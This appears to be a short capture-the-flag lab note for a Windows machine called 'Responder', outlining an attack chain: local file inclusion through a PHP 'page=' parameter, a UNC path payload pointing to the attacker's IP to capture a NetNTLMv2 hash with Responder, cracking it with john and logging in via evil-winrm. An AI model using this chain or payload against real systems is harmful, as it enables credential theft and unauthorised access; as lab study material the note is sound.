---
description: 'Windows, LFI, SMB Responder, evil-winrmPorts:'
---

# Responder

* 80 (http)
* 5985 (wsman): Allows PowerShell remote connections throught a WinRM endpoint.

### Process

1. LFI on the web application. PHP include() with `page=`
2. Because is a Windows machine, we try to obtain a NetNTLMv2 using Responder and the payload `\\ownIP\anycode`
3. After obtaining the NetNTLMv2, crack it using john
4. Connect with evil-winrm using the discovered credentials
